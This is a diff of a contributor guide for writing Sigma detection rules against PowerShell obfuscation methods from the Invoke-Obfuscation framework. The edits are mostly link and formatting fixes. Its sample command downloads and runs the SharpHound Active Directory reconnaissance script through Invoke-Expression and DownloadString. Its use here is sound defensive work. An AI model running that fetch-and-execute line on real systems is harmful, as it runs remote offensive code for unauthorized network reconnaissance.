@@ -2,7 +2,7 @@
 This is your guide on how you can help us with soving this issue.
 
 ## Tasklist
-You can pick up some of the methods of PowerShell command and script obfuscation, provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework from the table below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
+You can pick up some of the methods of PowerShell command and script obfuscation, provided by the [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation) framework below and develop Sigma rules for them. You will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
 ## Original command
 ```powershell
@@ -15,17 +15,17 @@ Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
 SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
 ```
-#### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/> Remember, you will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
+##### Just pick up the obfuscation method(s) and the appropriate Case(s) # you prefer and write a Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the number of the case(s) you solved <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1,3,7"*) <br/> (*e.g., "Develop Sigma rules for Invoke-Obfuscation #578 Case #1-15"*) <br/> Remember, you will need to use [regular expressions](https://github.com/Neo23x0/sigma/wiki/Specification#types) in Sigma rules.
 
 ### Contents
 SINGLE OBFUSCATION
-  - [TOKEN OBFUSCATION]()
-  - [STRING OBFUSCATION]()
-  - [ENCODING OBFUSCATION]()
-  - [COMPRESS OBFUSCATION]()
-  - [PS LAUNCHER OBFUSCATION]()
-  - [CMD LAUNCHER OBFUSCATION]()
-  - [WMIC LAUNCHER OBFUSCATION]()
+  - [TOKEN OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#token-obfuscation)
+  - [STRING OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#string-obfuscation)
+  - [ENCODING OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#encoding-obfuscation)
+  - [COMPRESS OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#compress-obfuscation)
+  - [PS LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#ps-launcher-obfuscation)
+  - [CMD LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#cmd-launcher-obfuscation)
+  - [WMIC LAUNCHER OBFUSCATION](https://github.com/zinint/oscd_Invoke-Obfuscation/blob/master/OSCD%20-%20Issue%20-%20Invoke-Obfuscation.md#wmic-launcher-obfuscation)     
 MULTIPLE OBFUSCATION
 
 ### TOKEN OBFUSCATION
